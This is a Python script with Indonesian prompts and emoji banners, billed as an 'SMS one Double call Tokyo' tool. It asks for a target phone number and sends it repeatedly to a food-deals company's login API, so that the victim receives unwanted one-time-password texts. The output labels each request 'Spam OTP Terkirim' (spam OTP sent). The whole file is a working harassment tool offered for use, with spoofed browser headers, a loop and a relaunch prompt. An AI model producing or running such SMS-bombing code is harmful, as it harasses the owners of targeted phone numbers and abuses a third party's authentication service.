import os,sys,time,requests,json
from requests import post
def balik():
   f = input("{kuning} Lanjut atau Tidak..? : (y/n) : \033[1;32m")
   if f == "y":
      os.system("python3 tokyo.py")
   elif f == "n":
        sys.exit("\033[1;31m")

merah = '\033[1;31m' 
cyan = '\033[1;36m'       
kuning = '\033[1;33m' 
hijau = '\033[1;32m'
ungu = '\033[1;35m'
putih = '\033[1;37m'
biru = '\033[1;34m'
     

os.system('clear')
def asw(b):
  for m in b + "\n":
      sys.stdout.write(m)
      sys.stdout.flush()
      time.sleep(1./100)
                     
def lo(s):
  for c in s  + "\n":
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(1./100)

asw(f"{hijau}🌏 Memeriksa system perangkat 🦍 🙈🙉🙊🐵🦁🐯🐱🐶🐺🐻🐨🐼🐹🐭🐰🦊🦝🐮")
print()
asw(f"{kuning}💾 Singkronisasi coding... 🍊🥭🍍🍌🍋🍈🍏🍐🥝🍇🥥🍅🌶️🥕🍠🧅🌽🥦🥒🥬🥑")
os.system("clear")                                                                            
asw(f"{hijau}____________________________________________________________________________________________________")
asw(f"{cyan}         🐮 SMS one Double call Tokyo 🐮 ")
asw(f"{hijau}                  🌏 Online 🌏    ")
asw(f"{kuning}            🍓 By Idham Ramadhan 🍓 ")
asw(f"{hijau}__________________________________________________") 
asw(f"{putih}=>{hijau} 😁 Contoh nomor 😁 => {kuning}+62xxxxxxx")
asw(f"{cyan}__________________________________________________")
no = input("\033[1;32m😎 Nomor Target 😎 => \033[1;31m")


ua = {
"Host": "api.myfave.com",
"Conection": "keep-alive",
"x-user-agent": "Fave-PWA/v2.0.0",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
"content-type": "application/json",
"Accept": "*/*",
"Origin": "https://m.myfave.com",
"Referer": "https://m.myfave/jakarta/auth",                  
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
for i in range(1,5):
    dat = {"phone":no}
    r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
    if "6c047709f9da4291a568fa84b97b6d47" in r:
        print ("=> Spam OTP Terkirim 🤪 => ")
    else:
        print ("=> Spam OTP Terkirim 🤪 => ")
    time.sleep(25)

balik() 
